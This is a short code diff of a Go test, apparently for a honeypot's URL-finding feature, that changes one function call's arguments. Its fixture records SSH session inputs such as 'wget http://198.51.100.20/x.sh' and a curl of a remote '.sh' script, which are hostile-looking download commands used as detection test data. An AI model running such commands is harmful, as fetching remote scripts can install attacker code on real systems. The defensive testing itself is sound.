@@ -70,7 +70,7 @@ func TestURLFindingsOwnMarkers(t *testing.T) {
 	addEvent(h, "command", "ssh", "203.0.113.50", "", "", map[string]any{"input": "wget http://198.51.100.20/x.sh"})
 	addEvent(h, "command", "ssh", "203.0.113.51", "", "", map[string]any{"input": "wget http://198.51.100.21/r?t=198.51.100.40"})
 	addEvent(h, "command", "ssh", "203.0.113.52", "", "", map[string]any{"input": "curl http://198.51.100.22/Gartenhaus-NAS/a.sh"})
-	got, err := h.urlFindings(context.Background(), time.Now().Add(-time.Hour))
+	got, err := h.urlFindings(context.Background(), time.Now().Add(-time.Hour), nil)
 	if err != nil {
 		t.Fatal(err)
 	}
